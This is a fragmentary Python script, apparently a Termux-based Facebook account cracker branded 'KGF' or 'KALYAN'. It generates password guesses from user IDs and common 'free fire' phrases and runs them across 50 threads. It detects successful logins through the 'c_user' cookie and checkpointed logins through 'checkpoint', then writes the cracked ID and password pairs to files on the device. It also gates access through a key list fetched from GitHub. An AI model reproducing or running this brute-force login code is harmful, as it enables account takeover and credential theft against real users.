...
ha = current.day
today = date.today()
os.system('xdg-open https://t.me/+qRMtgmzz1F8zY2Q9')
logo =("""
  \033[0;92m       
\033[41m\x1b[1;97m##    ##  ######   ########   \33[m \n ##   ##  ##    ##  ## \033[32m          \n ##  ##   ##        ##  \033[33m         \n #####    ##   #### ######     \33[1;96m \n ##  ##   ##    ##  ##    \x1b[0;34m      \n ##   ##  ##    ##  ##    \033[95m      \n  ##    ##  ######   ##\n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
\033[1;32m║NOTE : \033[37;41mTHIS TOOLS IS FREE\033[0;m\033[1;32m         ║║ 

\033[1;34m║AUTHOR    : ☞☞KAlYAN ×KING✆             

\033[1;36m║TEM NAmE√  : TARMUX KGF TEM  ◑⊕       

\033[1;38m║GITHUB    : KGF-CYBER✔✔✔           

\033[1;31m║SERVER    : DATA :      WORKING   

\033[1;32m | Version 	 : 0.3

\033[1;36m | NEW UPDET  : 16/08/24
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(' \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××')
        for love in user:
            pwx = [love,'i love free fire','freefire','freefire123','freefire321','freefire@123','freefire@321','free fire','free fire123','free fire@123','free fire321',' free fire@321','free fire123','i love you']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45m𝗦𝗞-𝗞𝗔𝗟𝗬𝗔𝗡-OK🌺\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🤖\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                os.system('espeak -a 300 " KALYAN,  Ok,  id"')
                open('/sdcard/𝗦𝗞-𝗞𝗔𝗟𝗬𝗔𝗡-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[𝗦𝗞-𝗞𝗔𝗟𝗬𝗔𝗡🥲🥲-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝗦𝗞-𝗞𝗔𝗟𝗬𝗔𝗡-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr}𝗦𝗞-𝗞𝗔𝗟𝗬𝗔𝗡😊🌺🌺🌺{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Kallanooo12/Kallan_hak/blob/main/Avrolvel1.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
        ...
        os.system('am start https://www.facebook.com/profile.php?id=100086270594350?text=' + tks)
        superuser()        
superuser()
